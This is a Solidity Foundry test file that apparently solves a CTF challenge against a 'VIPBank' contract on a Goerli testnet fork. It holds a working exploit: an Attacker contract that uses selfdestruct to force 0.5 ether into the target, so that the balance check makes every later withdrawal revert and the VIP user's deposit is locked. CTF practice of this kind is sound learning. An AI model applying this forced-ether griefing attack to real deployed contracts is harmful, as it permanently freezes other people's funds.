// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "forge-std/console.sol";


/** 
    Objective of CTF:
    At any cost, lock the VIP user balance forever into the contract.
*/


contract Attacker {

    constructor() public payable {}

    // Will force ether to the target contract and destroy it
    function exploit(address payable _target) public payable {
        selfdestruct(payable(_target));
    }
}


contract VIPBankHack is Test {
    IVIPBank _target = IVIPBank(0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2);
    Attacker _attacker;
    address public manager = 0xE48A248367d3BC49069fA01A26B7517756E32a52;
    

    function setUp() public {

        // Create a fork against the goeli testnet
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli");

        // Deploy the Attacker contract with  some Ether
        _attacker = new Attacker{value : 2 ether}();
    }

    
    function test_LockFunds() public {

        // The Manager add VIP custumer to the bank
        vm.startPrank(manager);
        _target.addVIP(address(this));

        // Transfer 1 ETH to address(this)
        vm.deal(address(this), 1 ether);

        vm.startPrank(address(this));
        _target.deposit{value: 0.05 ether}();
        vm.stopPrank();

        // Exploit!!
        _attacker.exploit{value : 0.5 ether}(payable (address(_target)));

        vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");

        _target.withdraw(0.05 ether);

        // Funds got locked!
    }

}


interface IVIPBank {
    function VIP(address) external view returns (bool);

    function addVIP(address addr) external;

    function balances(address) external view returns (uint256);

    function contractBalance() external view returns (uint256);

    function deposit() external payable;

    function manager() external view returns (address);

    function maxETH() external view returns (uint256);

    function withdraw(uint256 _amount) external;
}